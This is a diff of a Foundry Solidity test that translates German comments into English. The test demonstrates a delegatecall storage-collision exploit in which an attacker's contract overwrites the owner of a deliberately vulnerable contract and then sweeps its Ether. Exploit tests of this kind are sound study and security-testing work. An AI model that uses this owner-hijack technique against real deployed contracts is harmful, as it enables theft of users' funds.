@@ -14,12 +14,12 @@ contract DelegatecallTest is Test {
     address payable treasury = payable(address(0xBEEF));
 
     function setUp() public {
-        // Deployer ist vorerst Owner
+        // Deployer is initially the owner
         vulnerable = new Vulnerable{value: 5 ether}();
         logic = new LogicContract();
         attack = new Attack();
 
-        // Ein wenig zusätzliches Ether einzahlen, das der Angreifer später "sweept"
+        // Deposit some additional Ether that the attacker will later "sweep"
         vm.deal(treasury, 10 ether);
         vm.prank(treasury);
         (bool ok, ) = address(vulnerable).call{value: 3 ether}("");
@@ -27,17 +27,17 @@ contract DelegatecallTest is Test {
     }
 
     function testExploitDelegatecallOwnerHijack() public {
-        // Sanity: zu Beginn ist der Angreifer nicht Owner
+        // Sanity check: at the start, attacker is not the owner
         assertTrue(vulnerable.owner() != attackerEOA, "pre: attacker already owner?");
 
-        // Angreifer ruft setVars mit seiner bösartigen Logik auf
+        // Attacker calls setVars with their malicious logic contract
         vm.prank(attackerEOA);
         vulnerable.setVars(address(attack), 123);
 
-        // Jetzt sollte owner im Vulnerable auf attackerEOA überschrieben sein
+        // Now the owner in Vulnerable should be overwritten to attackerEOA
         assertEq(vulnerable.owner(), attackerEOA, "owner should be attacker after delegatecall");
 
-        // Angreifer kann nun das Guthaben abziehen
+        // Attacker can now withdraw the funds
         uint256 before = attackerEOA.balance;
         vm.prank(attackerEOA);
         vulnerable.sweep(attackerEOA);
